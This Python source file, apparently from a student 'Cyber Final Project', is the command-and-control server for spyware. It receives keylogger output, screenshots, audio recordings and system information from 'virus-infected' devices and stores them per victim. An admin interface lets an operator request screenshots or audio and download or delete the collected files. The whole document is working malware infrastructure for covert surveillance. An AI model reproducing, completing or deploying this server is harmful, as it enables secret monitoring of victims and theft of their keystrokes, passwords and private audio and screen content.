from fileinput import filename
import socket
import threading
import os
from os.path import join
import pyaudio
import wave
import shutil

HEADER = 2048
PORT = 5050
SERVER = socket.gethostbyname(socket.gethostname())
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
DISCONNECT_MESSAGE = "!DISCONNECT"
PATH = "D:\\Cyber Final Project\\FireRasbarry\\"
IDENTIFIERS = ['screenshot', 'audio', 'computer_info', 'key_logger']
IDENTIFIERS_EXTENSIONS = ['png', 'wav', 'txt', 'txt']


class VirusSocket(threading.Thread):
    # A socket opened per connected virus-infected device
    def __init__(self, conn: socket.socket, addr: socket.socket):
        super(VirusSocket, self).__init__()
        self.conn = conn
        self.addr = addr

        # Thread stuff here
        self.daemon = True

    def run(self):
        print(f"[NEW CONNECTION] {self.addr} connected")
        filenames = []  # in dir

        # Opening a folder for the CONNECTION

        # First 2048 = identifier

        try:
            # Create a folder once
            folder_path = PATH + str(self.addr)
            if not os.path.isdir(PATH + str(self.addr)):
                os.makedirs(folder_path)

            while True:
                filenames = [f for f in os.listdir(folder_path) if os.path.isfile(join(folder_path, f))]

                identifier = self.conn.recv(2048).decode(FORMAT).replace(" ", "")
                if identifier:
                    if identifier not in IDENTIFIERS:
                        print('Unknown identifier')
                        print(self.addr, str(identifier))
                        # continue  # Skip to next recv

                    # Saving file
                    filename, openmode = get_filename_openmode(identifier, filenames)
                    filepath = folder_path + "\\" + filename

                    # Second 2048 = length
                    data_length = int(self.conn.recv(2048).decode(FORMAT).replace(" ", ""))
                    print(data_length)
                    # Write a file based on it's identifier (f.e. keylogger -> append, screenshot -> add)
                    data = self.conn.recv(data_length)
                    file = open(filepath, openmode)
                    print(len(data))
                    file.write(data)
                    file.close()

        except Exception as e:
            print('Excention: ', e)
            self.conn.close()

    def request_from_virus(self, req_type: str):
        if req_type == 'screenshot':
            self.conn.send('Give me a screenshot'.encode())


class Server:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(ADDR)
        print(ADDR)
        self.sock.listen()
        self.virus_devices = {}
        thread = threading.Thread(target=self.accept_clients)
        thread.start()

    def accept_clients(self):
        while True:
            print(f"[LISTENING] Server is listening on {SERVER}")
            conn, addr = self.sock.accept()
            print(str(addr) + "aaaaaaaaa")
            self.virus_devices[str(addr).replace(" ", "")] = VirusSocket(conn, addr)

            self.virus_devices[str(addr).replace(" ", "")].start()
            print(f"[ACTIVE CONNECTIONS] {threading.active_count() - 1}")

    def __del__(self):
        # Runs when object destroyed
        print('Closing socket')
        self.sock.close()


# Function returns filename and file open mode based on current files in client's dir
def get_filename_openmode(identifier, filenames):
    # Special cases -> computer_info, key_logger
    match identifier:
        case 'key_logger':
            return 'key_logger.txt', 'ab'
        case 'computer_info':
            return 'computer_info.txt', 'wb'
        case _:
            counter = 0
            for filename in filenames:
                if identifier in filename:
                    counter += 1
            print(f'{identifier}_{counter}.{IDENTIFIERS_EXTENSIONS[IDENTIFIERS.index(identifier)]}', 'wb')
            return f'{identifier}_{counter}.{IDENTIFIERS_EXTENSIONS[IDENTIFIERS.index(identifier)]}', 'wb'


class AdminServer:
    def __init__(self, server):
        self.msg = None
        self.viruses_server = server
        PORT = 5055
        SERVER = socket.gethostbyname(socket.gethostname())
        ADDR = (SERVER, PORT)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.bind(ADDR)
        self.sock.listen()
        while True:
            conn, addr = self.sock.accept()
            self.handle_admin(conn)

    def handle_admin(self, conn):
        try:
            while True:
                msg = conn.recv(2048).decode()
                if msg == '':
                    print('Received none, probably a connection loss')
                    break  # Shouldn't handle disconnected admin
                msg = msg.replace(" ", "")
                self.handle_message(msg, conn)
        except:
            print("admin disconnected")

    def handle_message(self, msg, conn):
        self.msg = msg
        if self.is_self_action():
            self.self_action(conn)
        else:
            self.send_to_virus()

    def is_self_action(self):
        if "download" in self.msg:
            return True
        elif "delete" in self.msg:
            return True
        elif "getfolders" in self.msg:
            return True
        elif "getfiles" in self.msg:
            return True
        else:
            return False

    def self_action(self, conn):
        if "delete" in self.msg:  # DELETE
            path = self.msg[6:]
            # We identify between a file and a folder by the dot if we have dot in [-4] it file
            if path[-4] == ".":
                os.remove(path)
            # else = folder
            else:
                shutil.rmtree(path)

        elif "download" in self.msg:  # DOWNLOAD
            is_folder = False
            name = ""
            path = self.msg[8:]
            if path[-4] != ".":  # when it's a folder, create a zip file
                shutil.make_archive(path, 'zip', path)
                path += '.zip'
                is_folder = True
            with open(path, 'rb') as file:
                data = file.read()
            # for sending files/folders to the admin we send it in 3 chunks
            # 1 : id of the data
            # 2 : length of the data chunk
            # 3 : data
            # sending the id of the file first
            if not is_folder:
                name = path.split("\\")[-2]
            name += path.split("\\")[-1]
            send_file_name = name.encode()
            send_file_name += b' ' * (2048 - len(send_file_name))
            conn.send(send_file_name)
            # sending the length of the data
            send_length = str(len(data)).encode()
            send_length += b' ' * (HEADER - len(send_length))
            conn.send(send_length)
            conn.send(data)
            # We identify between a file and a folder by the dot if we have dot in [-4] it file
            if path[-4] == ".":
                os.remove(path)
            # else = folder
            else:
                shutil.rmtree(path)




        elif "getfolders" == self.msg:
            path = ".\\"
            folder_names = [f for f in os.listdir(path) if not os.path.isfile(join(path, f))]
            data = ""
            for folder in folder_names:
                data += "---" + folder
            msg = data[3:].encode()
            msg += b' ' * (2048 - len(msg))
            conn.send(msg)

        elif "getfiles" in self.msg:
            path = self.msg[8:]
            file_names = [f for f in os.listdir(path) if os.path.isfile(join(path, f))]
            print(path)
            data = ""
            for file in file_names:
                data += "---" + file
            msg = data[3:].encode()
            msg += b' ' * (2048 - len(msg))
            conn.send(msg)
        else:
            print("something went wrong")

    def send_to_virus(self):
        # Identification of the request
        if "screenshot" in self.msg:
            addr = self.msg.split("screenshot")[-1]
            print(self.viruses_server.virus_devices)
            virus_socket = self.viruses_server.virus_devices[addr]
            msg_to_virus = "screenshot".encode()
            msg_to_virus += b' ' * (2048 - len(msg_to_virus))
            virus_socket.conn.send(msg_to_virus)
        elif "pcinfo" in self.msg:
            pass
        elif "keylogger" in self.msg:
            pass
        elif "audio" in self.msg:
            addr = self.msg.split("audio")[-1]

            print(self.viruses_server.virus_devices)
            virus_socket = self.viruses_server.virus_devices[addr]
            msg_to_virus = "audio".encode()
            msg_to_virus += b' ' * (2048 - len(msg_to_virus))
            virus_socket.conn.send(msg_to_virus)

        else:
            print("something went wrong")


def main():
    server = Server()
    admin_socket = AdminServer(server)


if __name__ == '__main__':
    main()
